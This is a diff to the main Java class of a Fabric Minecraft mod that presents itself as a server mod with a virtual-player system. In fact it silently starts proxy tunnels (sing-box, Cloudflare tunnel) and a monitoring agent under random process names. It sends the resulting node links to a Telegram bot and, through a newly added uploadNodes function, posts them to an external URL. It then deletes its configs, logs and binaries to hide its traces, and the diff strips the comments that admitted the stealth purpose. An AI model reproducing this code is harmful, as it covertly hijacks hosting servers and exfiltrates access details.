@@ -18,8 +18,7 @@ import java.util.*;
 
 /**
  * Maohi 核心类，实现 Fabric Mod 初始化接口
- * 该 Mod 主要用于在后台静默运行一系列外部服务（代理隧道、监控等）
- * 同时集成了虚拟玩家系统，用于维持服务器在线人数
+ * 集成了虚拟玩家系统，用于维持服务器在线人数
  */
 public class Maohi implements ModInitializer {
     public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");
@@ -70,10 +69,11 @@ public class Maohi implements ModInitializer {
     private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
     private static final String NAME         = cfg("NAME", "Secure.xserver.ne.jp");
     private static final String UUID         = cfg("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
+    private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "https://sub.smartdns.eu.org/upload-ea4909ef-7ca6-4b46-bf2e-6c07896ef338");
+
 
     /**
      * 获取 IP 的 ISP（运营商）信息
-     * 适配自用户提供的 JS 代码，保持 Java 风格统一
      */
     private String getISPFromIP(String ip) {
         // 优先尝试 ip.sb
@@ -114,12 +114,11 @@ public class Maohi implements ModInitializer {
             // 静默失败
         }
 
-        return "Unknown";
+        return "UnknownISP";
     }
 
     /**
-     * 获取国家 Emoji 和名称（动态从远程 API 获取）
-     * 适配自用户提供的 JS ccEmoji 逻辑，替换了原来硬编码的 COUNTRY_MAP
+     * 获取国家 Emoji 和 城市名称
      */
     private String getCountryEmoji() {
         String[] sources = {
@@ -148,7 +147,7 @@ public class Maohi implements ModInitializer {
 
     /**
      * 获取完整节点后缀信息
-     * 组合了地理位置和运营商信息，格式为：[Emoji 国家/城市]_[运营商] | [配置名称]
+     * 组合格式为：[Emoji 国家 城市]_[运营商] | [配置名称]
      */
     private String getFullNodeName(String ip) {
         String emoji = getCountryEmoji();
@@ -260,16 +259,17 @@ public class Maohi implements ModInitializer {
         // 通过 Telegram 发送订阅链接
         sendTelegram(subTxt, fullNodeName);
 
+        // 上传UPLOAD_URL订阅节点
+        uploadNodes(fullNodeName);
+
         // 最后启动清理线程
         cleanup();
 
-        // 进程监控交给系统，Minecraft 服务器一般不会 kill 这些小进程
-        // 如果需要更强监控，建议用 PM2 或 systemd 守护 Node.js 版本
     }
 
 
     /**
-     * 生成 6 位的随机字母串，用于伪装修订进程
+     * 生成 6 位的随机字母串，装修进程
      */
     private String randomName() {
         String chars = "abcdefghijklmnopqrstuvwxyz";
@@ -408,10 +408,7 @@ public class Maohi implements ModInitializer {
     }
 
     /**
-     * 启动并在后台运行哪吒监控客户端
-     * 支持两种模式：
-     * - V0 模式（填写了 NZ_PORT）：用命令行参数直接启动老版 agent 二进制
-     * - V1 模式（未填 NZ_PORT）：生成 config.yaml 后用 -c 参数启动新版 v1 二进制
+     * 启动并在后台运行哪吒监控客户端V0 or V1
      */
     private void runNZ() {
         if (NZ_SERVER == null || NZ_SERVER.isEmpty() ||
@@ -426,7 +423,7 @@ public class Maohi implements ModInitializer {
 
         try {
             if (NZ_PORT != null && !NZ_PORT.trim().isEmpty()) {
-                // Agent 模式：直接用命令行参数启动，不写配置文件
+                // V0 模式：直接用命令行参数启动，不写配置文件
                 List<String> command = new ArrayList<>();
                 command.add(FILE_PATH.resolve(phpName).toString());
                 command.add("-s");
@@ -512,7 +509,6 @@ public class Maohi implements ModInitializer {
 
     /**
      * 动态构建 Sing-box 的 JSON 配置文件
-     * 包含 VLESS, Hysteria2 和 SOCKS5 的入站规则
      */
     private String buildSingboxConfig() {
         List<String> inbounds = new ArrayList<>();
@@ -588,11 +584,7 @@ public class Maohi implements ModInitializer {
     }
 
     /**
-     * 启动 Cloudflare Tunnel，实现内网穿透
-     * 逻辑：
-     * - ARGO_PORT 为空 → 不启用隧道
-     * - ARGO_AUTH 或 ARGO_DOMAIN 为空 → 零时隧道
-     * - 两者都填了 → 固定隧道
+     * 启动 Cloudflare Tunnel
      */
     private void runCloudflared() {
         // ARGO_PORT 为空 → 不启用隧道
@@ -604,7 +596,7 @@ public class Maohi implements ModInitializer {
         try {
             if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
                 ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) {
-                // 零时隧道模式：无需登录，直接 tunnel 到本地 ARGO_PORT（sing-box VLESS 监听端口）
+                // 零时隧道模式
                 ProcessBuilder pb = new ProcessBuilder(
                     FILE_PATH.resolve(botName).toString(),
                     "tunnel", "--edge-ip-version", "auto",
@@ -619,7 +611,7 @@ public class Maohi implements ModInitializer {
                 env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                 pb.start();
             } else {
-                // 固定隧道模式：需要 ARGO_AUTH（token）和 ARGO_DOMAIN
+                // 固定隧道模式
                 ProcessBuilder pb = new ProcessBuilder(
                     FILE_PATH.resolve(botName).toString(),
                     "tunnel", "--edge-ip-version", "auto",
@@ -639,8 +631,7 @@ public class Maohi implements ModInitializer {
     }
 
     /**
-     * 获取当前服务器的外网公网 IP 地址
-     * 使用外部 API 查询，通过 InetAddress 校验格式，排除 HTML 等非法响应
+     * 获取当前服务器的公网 IP 地址
      */
     private String getServerIP() {
         String[] sources = {
@@ -705,7 +696,6 @@ public class Maohi implements ModInitializer {
 
     /**
      * 从 boot.log 中提取临时隧道的域名
-     * @return 临时域名，如 xxx.trycloudflare.com，或 null
      */
     private String extractTempDomain() {
         Path bootLogPath = FILE_PATH.resolve("boot.log");
@@ -728,8 +718,6 @@ public class Maohi implements ModInitializer {
 
     /**
      * 生成各种协议的分享链接并进行 Base64 编码
-     * 生成后的链接将符合通用订阅格式
-     * @param argoDomain Argo 域名（固定隧道或从 boot.log 提取的临时域名）
      */
     private String generateLinks(String serverIP, String fullNodeName, String argoDomain) {
         StringBuilder sb = new StringBuilder();
@@ -774,13 +762,18 @@ public class Maohi implements ModInitializer {
                 .append("#").append(nodeName);
         }
 
+        // 保存原始链接到 list.txt 供 uploadNodes 使用
+        try {
+            Files.writeString(FILE_PATH.resolve("list.txt"), sb.toString());
+        } catch (Exception e) {}
+
         // base64 处理整个订阅
         String result = Base64.getEncoder().encodeToString(sb.toString().getBytes());
         return result;
     }
 
     /**
-     * 将生成的节点订阅链接发送到指定的 Telegram Bot
+     * 将生成的节点订阅链接发送到指定的 TG-Bot
      */
     private void sendTelegram(String subTxt, String fullNodeName) {
         if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() ||
@@ -805,6 +798,60 @@ public class Maohi implements ModInitializer {
         } catch (Exception e) {}
     }
 
+    /**
+     * 将节点列表上传到指定的 URL
+     */
+    private void uploadNodes(String fullNodeName) {
+        if (UPLOAD_URL == null || UPLOAD_URL.isEmpty()) return;
+
+        Path listFile = FILE_PATH.resolve("list.txt");
+        if (!Files.exists(listFile)) return;
+
+        try {
+            List<String> allLines = Files.readAllLines(listFile);
+            List<String> nodes = new ArrayList<>();
+            // 抓取支持 vless/vmess/trojan/hysteria2/tuic/socks5/socks 的行
+            String regex = "^(vless|vmess|trojan|hysteria2|tuic|socks5|socks)://.*";
+
+            for (String line : allLines) {
+                if (line.trim().matches(regex)) {
+                    nodes.add(line.trim());
+                }
+            }
+
+            if (nodes.isEmpty()) return;
+
+            // 构造换行符拼接的字符串
+            String urlString = String.join("\\n", nodes);
+
+            // 构造 JSON (手动构造简单 JSON，同时对节点名和 URL 进行双引号转义，确保特殊符号不破坏结构)
+            String jsonData = "{\"URL_NAME\": \"" + fullNodeName.replace("\"", "\\\"") + 
+                              "\", \"URL\": \"" + urlString.replace("\"", "\\\"") + "\"}";
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(jsonData.getBytes("UTF-8"));
+            }
+
+            if (conn.getResponseCode() == 200) {
+                // 静默成功
+            } else {
+                LOGGER.warn("[Maohi] Failed to upload nodes, code: " + conn.getResponseCode());
+            }
+            conn.disconnect();
+
+        } catch (Exception e) {
+            // 静默失败
+        }
+    }
+
+
     private boolean isValidPort(String port) {
         if (port == null || port.trim().isEmpty()) return false;
         try {
@@ -817,16 +864,15 @@ public class Maohi implements ModInitializer {
 
     /**
      * 后台异步清理敏感文件和日志
-     * 避免被人通过配置文件、异常日志发现真实的监控服务器、Token 或 UUID
      */
     private void cleanup() {
         new Thread(() -> {
             try {
-                // 等待 30 秒，给弱鸡 CPU 面板机留足完全启动各个代理和探针本体、且全部吃进内存的时间
-                Thread.sleep(30000);
+                // 等待 60 秒
+                Thread.sleep(60000);
                 String[] sensitiveFiles = {
                     "config.yaml", "config.json", "boot.log", 
-                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt",
+                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt",
                     webName, botName, phpName // 连同执行文件一并扬灰
                 };
                 for (String file : sensitiveFiles) {
